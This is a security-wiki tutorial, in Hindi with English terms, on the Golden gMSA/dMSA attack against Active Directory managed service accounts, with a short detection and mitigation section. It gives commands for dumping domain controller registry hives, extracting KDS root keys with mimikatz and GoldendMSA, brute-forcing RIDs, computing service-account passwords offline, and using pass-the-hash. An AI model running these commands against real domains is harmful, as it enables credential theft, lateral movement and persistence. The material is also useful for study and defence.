# Golden gMSA/dMSA Attack (Managed Service Account Passwords की Offline Derivation)

{{#include ../../banners/hacktricks-training.md}}

## Overview

Windows Managed Service Accounts (MSA) विशेष principals होते हैं, जिन्हें services चलाने के लिए बनाया गया है, ताकि उनके passwords को manually manage करने की आवश्यकता न हो।
इसके दो प्रमुख flavours हैं:

1. **gMSA** – group Managed Service Account – इसे उन multiple hosts पर use किया जा सकता है जो इसके `msDS-GroupMSAMembership` attribute में authorised हैं।
2. **dMSA** – delegated Managed Service Account – यह gMSA का (preview) successor है, जो उसी cryptography पर निर्भर करता है, लेकिन अधिक granular delegation scenarios की अनुमति देता है।

दोनों variants के लिए **password** प्रत्येक Domain Controller (DC) पर regular NT-hash की तरह stored नहीं होता। इसके बजाय प्रत्येक DC निम्नलिखित inputs से current password को on-the-fly derive कर सकता है:

* Forest-wide **KDS Root Key** (`KRBTGT\KDS`) – randomly generated GUID-named secret, जो प्रत्येक DC पर `CN=Master Root Keys,CN=Group Key Distribution Service, CN=Services, CN=Configuration, …` container के अंतर्गत replicated होता है।
* Target account का **SID**।
* Per-account **ManagedPasswordID** (GUID), जो `msDS-ManagedPasswordId` attribute में पाया जाता है।

Derivation यह है: `AES256_HMAC( KDSRootKey , SID || ManagedPasswordID )` → 240 byte blob, जिसे अंततः **base64-encoded** करके `msDS-ManagedPassword` attribute में stored किया जाता है।
Normal password usage के दौरान किसी Kerberos traffic या domain interaction की आवश्यकता नहीं होती – member host locally password derive कर सकता है, यदि उसे ये तीनों inputs पता हों।

## Golden gMSA / Golden dMSA Attack

यदि attacker इन तीनों inputs को **offline** प्राप्त कर सकता है, तो वह DC से दोबारा interact किए बिना forest के **किसी भी gMSA/dMSA के valid current और future passwords** compute कर सकता है, और निम्नलिखित को bypass कर सकता है:<sup>[[1]](#references)[[2]](#references)</sup>

* LDAP read auditing
* Password change intervals (वे पहले से compute किए जा सकते हैं)

यह service accounts के लिए एक *Golden Ticket* के समान है।<sup>[[1]](#references)[[2]](#references)</sup>

### Prerequisites

1. **एक DC का forest-level compromise** (या Enterprise Admin), अथवा forest के किसी DC पर `SYSTEM` access।
2. Service accounts enumerate करने की ability (LDAP read / RID brute-force)।
3. [`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) या equivalent code चलाने के लिए .NET ≥ 4.7.2 x64 workstation।<sup>[[3]](#references)</sup>

### Golden gMSA / dMSA
#### Phase 1 – KDS Root Key Extract करना

किसी भी DC से dump करें (Volume Shadow Copy / raw SAM+SECURITY hives या remote secrets):<sup>[[1]](#references)[[2]](#references)</sup>
```cmd
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM  system.hive

# With mimikatz on the DC / offline
mimikatz # lsadump::secrets
mimikatz # lsadump::trust /patch   # shows KDS root keys too

# With GoldendMSA
GoldendMSA.exe kds --domain <domain name>   # query KDS root keys from a DC in the forest
GoldendMSA.exe kds

# With GoldenGMSA
GoldenGMSA.exe kdsinfo
```
`RootKey` (GUID name) के रूप में labelled base64 string बाद के steps में आवश्यक है।<sup>[[1]](#references)[[2]](#references)</sup>

##### Phase 2 – gMSA / dMSA objects Enumerate करें

कम से कम `sAMAccountName`, `objectSid` और `msDS-ManagedPasswordId` retrieve करें:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# Authenticated or anonymous depending on ACLs
Get-ADServiceAccount -Filter * -Properties msDS-ManagedPasswordId | \
Select sAMAccountName,objectSid,msDS-ManagedPasswordId

GoldenGMSA.exe gmsainfo
```
[`GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) helper modes implement करता है:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# LDAP enumeration (kerberos / simple bind)
GoldendMSA.exe info -d example.local -m ldap

# RID brute force if anonymous binds are blocked
GoldendMSA.exe info -d example.local -m brute -r 5000 -u jdoe -p P@ssw0rd
```
##### Phase 3 – ManagedPasswordID का अनुमान लगाना / खोज करना (जब अनुपस्थित हो)

कुछ deployments ACL-protected reads से `msDS-ManagedPasswordId` को *strip* कर देते हैं।  
क्योंकि GUID 128-bit होता है, naive bruteforce infeasible है, लेकिन:

1. पहले **32 bits = account creation का Unix epoch time** (minutes resolution)।
2. इसके बाद 96 random bits होते हैं।

इसलिए **प्रत्येक account के लिए एक narrow wordlist** (± कुछ घंटे) realistic है।
```bash
GoldendMSA.exe wordlist -s <SID> -d example.local -f example.local -k <KDSKeyGUID>
```
यह tool candidate passwords compute करता है और उनके base64 blob की तुलना वास्तविक `msDS-ManagedPassword` attribute से करता है – match होने पर सही GUID का पता चलता है।

##### Phase 4 – Offline Password Computation & Conversion

ManagedPasswordID ज्ञात होने के बाद, valid password प्राप्त करने के लिए केवल एक command चलानी होती है:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# derive base64 password
GoldendMSA.exe compute -s <SID> -k <KDSRootKey> -d example.local -m <ManagedPasswordID> -i <KDSRootKey ID>
GoldenGMSA.exe compute --sid <SID> --kdskey <KDSRootKey> --pwdid <ManagedPasswordID>
```
परिणामी hashes को **mimikatz** (`sekurlsa::pth`) या **Rubeus** के ज़रिए Kerberos abuse के लिए inject किया जा सकता है, जिससे stealth **lateral movement** और **persistence** संभव हो जाते हैं।

## Detection और Mitigation

* **DC backup और registry hive read** capabilities को Tier-0 administrators तक सीमित करें।
* DCs पर **Directory Services Restore Mode (DSRM)** या **Volume Shadow Copy** creation को monitor करें।
* `CN=Master Root Keys,…` के reads / changes और service accounts के `userAccountControl` flags का audit करें।
* असामान्य **base64 password writes** या hosts के बीच अचानक service password reuse का detection करें।
* जहाँ Tier-0 isolation संभव न हो, वहाँ high-privilege gMSAs को **classic service accounts** में बदलने पर विचार करें और नियमित random rotations लागू करें।

## Tooling

* [`Semperis/GoldenDMSA`](https://github.com/Semperis/GoldenDMSA) – इस page में उपयोग किया गया reference implementation।<sup>[[3]](#references)</sup>
* [`Semperis/GoldenGMSA`](https://github.com/Semperis/GoldenGMSA/) – इस page में उपयोग किया गया reference implementation।
* [`mimikatz`](https://github.com/gentilkiwi/mimikatz) – `lsadump::secrets`, `sekurlsa::pth`, `kerberos::ptt`।
* [`Rubeus`](https://github.com/GhostPack/Rubeus) – derived AES keys का उपयोग करके pass-the-ticket।

## References

- [1] [Golden dMSA – delegated Managed Service Accounts के लिए authentication bypass](https://www.semperis.com/blog/golden-dmsa-what-is-dmsa-authentication-bypass/)
- [2] [gMSA Active Directory Attacks Accounts](https://www.semperis.com/blog/golden-gmsa-attack/)
- [3] [Semperis/GoldenDMSA GitHub repository](https://github.com/Semperis/GoldenDMSA)

{{#include ../../banners/hacktricks-training.md}}
